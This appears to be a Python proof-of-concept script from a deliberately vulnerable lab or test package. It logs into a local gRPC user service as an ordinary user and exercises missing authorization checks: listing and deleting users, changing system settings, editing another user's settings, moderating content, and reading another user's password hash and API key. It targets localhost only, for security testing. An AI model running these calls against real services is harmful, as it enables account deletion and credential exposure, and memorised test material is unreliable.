#!/usr/bin/env python3
"""
Proof of Concept Script for Vulnerable gRPC Service
This script demonstrates authorization vulnerabilities in a gRPC service
"""

import grpc
import sys
import subprocess
import time
import os
import signal

# Import generated protobuf code
sys.path.insert(0, os.path.dirname(__file__))
try:
    import user_service_pb2
    import user_service_pb2_grpc
except ImportError:
    print("Error: Protobuf files not found. Please generate them first:")
    print("  python -m grpc_tools.protoc -I./proto --python_out=. --grpc_python_out=. proto/user_service.proto")
    sys.exit(1)

SERVER_ADDR = "localhost:50051"
SERVER_PID = None

def setup():
    """Start the gRPC server"""
    global SERVER_PID
    
    print("[*] Setting up environment...")
    
    # Check if server is already running
    try:
        channel = grpc.insecure_channel(SERVER_ADDR)
        grpc.channel_ready_future(channel).result(timeout=1)
        print("[*] Server is already running")
        return
    except:
        pass
    
    # Start server
    print(f"[*] Starting gRPC server on {SERVER_ADDR}...")
    proc = subprocess.Popen(
        ["go", "run", "main.go"],
        cwd=os.path.dirname(__file__),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    SERVER_PID = proc.pid
    
    # Wait for server to be ready
    print("[*] Waiting for server to be ready...")
    for i in range(10):
        try:
            channel = grpc.insecure_channel(SERVER_ADDR)
            grpc.channel_ready_future(channel).result(timeout=2)
            print("[+] Server is ready!")
            return
        except:
            time.sleep(1)
    
    raise Exception("Server failed to start within 10 seconds")

def cleanup():
    """Stop the server"""
    global SERVER_PID
    if SERVER_PID:
        try:
            os.kill(SERVER_PID, signal.SIGTERM)
            time.sleep(1)
        except:
            pass

def login(stub, username, password):
    """Login and get token"""
    request = user_service_pb2.LoginRequest(
        username=username,
        password=password
    )
    response = stub.Login(request)
    return response.token, response.user

def create_metadata(token):
    """Create gRPC metadata with authorization token"""
    return (('authorization', f'Bearer {token}'),)

def exploit():
    """Execute the attack: demonstrate authorization vulnerabilities"""
    print("\n[*] Starting exploitation...")
    
    # Connect to server
    channel = grpc.insecure_channel(SERVER_ADDR)
    stub = user_service_pb2_grpc.UserServiceStub(channel)
    
    vulnerabilities_confirmed = []
    
    # Test 1: Login as regular user
    print("\n" + "="*50)
    print("Test 1: Login as regular user (alice)")
    print("="*50)
    try:
        token, user = login(stub, "alice", "alice123")
        print(f"[+] Logged in as {user.username} (role: {user.role})")
        print(f"[+] Token: {token[:50]}...")
    except Exception as e:
        print(f"[-] Login failed: {e}")
        return False
    
    metadata = create_metadata(token)
    
    # Test 2: Regular user accessing admin endpoint
    print("\n" + "="*50)
    print("Test 2: Regular User Accessing Admin Endpoint")
    print("="*50)
    print("Vulnerability: Missing admin role check")
    try:
        request = user_service_pb2.ListAllUsersRequest()
        response = stub.ListAllUsers(request, metadata=metadata)
        print(f"[+] VULNERABILITY CONFIRMED: Regular user can list all users!")
        print(f"[+] Found {len(response.users)} users:")
        for u in response.users:
            print(f"    - {u.username} ({u.email}, role: {u.role})")
        vulnerabilities_confirmed.append("Regular user can access admin endpoints")
    except Exception as e:
        print(f"[-] Failed: {e}")
    
    # Test 3: Regular user deleting users
    print("\n" + "="*50)
    print("Test 3: Regular User Deleting Users")
    print("="*50)
    print("Vulnerability: Missing admin authorization check")
    try:
        request = user_service_pb2.DeleteUserRequest(user_id=2)  # Try to delete bob
        response = stub.DeleteUser(request, metadata=metadata)
        print(f"[+] VULNERABILITY CONFIRMED: Regular user can delete users!")
        print(f"[+] Response: {response.message}")
        vulnerabilities_confirmed.append("Regular user can delete users")
    except Exception as e:
        print(f"[-] Failed: {e}")
    
    # Test 4: Regular user updating system settings
    print("\n" + "="*50)
    print("Test 4: Regular User Updating System Settings")
    print("="*50)
    print("Vulnerability: Missing admin authorization check")
    try:
        request = user_service_pb2.UpdateSystemSettingsRequest(
            setting="maintenance_mode",
            value="true"
        )
        response = stub.UpdateSystemSettings(request, metadata=metadata)
        print(f"[+] VULNERABILITY CONFIRMED: Regular user can update system settings!")
        print(f"[+] Response: {response.message}")
        vulnerabilities_confirmed.append("Regular user can update system settings")
    except Exception as e:
        print(f"[-] Failed: {e}")
    
    # Test 5: User modifying other user's settings
    print("\n" + "="*50)
    print("Test 5: User Modifying Other User's Settings")
    print("="*50)
    print("Vulnerability: Missing ownership check")
    try:
        request = user_service_pb2.UpdateUserSettingsRequest(
            target_user_id=2,  # alice modifying bob's settings
            setting="theme",
            value="dark"
        )
        response = stub.UpdateUserSettings(request, metadata=metadata)
        print(f"[+] VULNERABILITY CONFIRMED: User can modify other user's settings!")
        print(f"[+] Response: {response.message}")
        vulnerabilities_confirmed.append("User can modify other user's settings")
    except Exception as e:
        print(f"[-] Failed: {e}")
    
    # Test 6: Regular user moderating content
    print("\n" + "="*50)
    print("Test 6: Regular User Moderating Content")
    print("="*50)
    print("Vulnerability: Missing moderator role check")
    try:
        request = user_service_pb2.ModerateContentRequest(
            content_id="content123",
            action="approve"
        )
        response = stub.ModerateContent(request, metadata=metadata)
        print(f"[+] VULNERABILITY CONFIRMED: Regular user can moderate content!")
        print(f"[+] Response: {response.message}")
        vulnerabilities_confirmed.append("Regular user can moderate content")
    except Exception as e:
        print(f"[-] Failed: {e}")
    
    # Test 7: Information disclosure
    print("\n" + "="*50)
    print("Test 7: Information Disclosure")
    print("="*50)
    print("Vulnerability: Exposing sensitive information")
    try:
        request = user_service_pb2.GetUserDetailsRequest(user_id=2)  # alice accessing bob's details
        response = stub.GetUserDetails(request, metadata=metadata)
        print(f"[+] VULNERABILITY CONFIRMED: Sensitive information exposed!")
        print(f"[+] User Details:")
        print(f"    Username: {response.username}")
        print(f"    Email: {response.email}")
        print(f"    Role: {response.role}")
        print(f"    Password Hash: {response.password_hash} (SHOULD NOT BE EXPOSED)")
        print(f"    API Key: {response.api_key} (SHOULD NOT BE EXPOSED)")
        vulnerabilities_confirmed.append("Sensitive information exposed")
    except Exception as e:
        print(f"[-] Failed: {e}")
    
    # Summary
    print("\n" + "="*50)
    print("Summary")
    print("="*50)
    print(f"Vulnerabilities confirmed: {len(vulnerabilities_confirmed)}")
    for i, vuln in enumerate(vulnerabilities_confirmed, 1):
        print(f"  {i}. ✓ {vuln}")
    
    return len(vulnerabilities_confirmed) > 0

def validate(result) -> bool:
    """Check if vulnerabilities were confirmed"""
    return result

if __name__ == "__main__":
    try:
        setup()
        result = exploit()
        confirmed = validate(result)
    except Exception as e:
        print(f"ERROR: {e}")
        import traceback
        traceback.print_exc()
        confirmed = False
    finally:
        cleanup()
    
    if confirmed:
        print("\n[+] VULNERABILITIES CONFIRMED")
        sys.exit(0)
    else:
        print("\n[-] VULNERABILITIES NOT CONFIRMED")
        sys.exit(1)
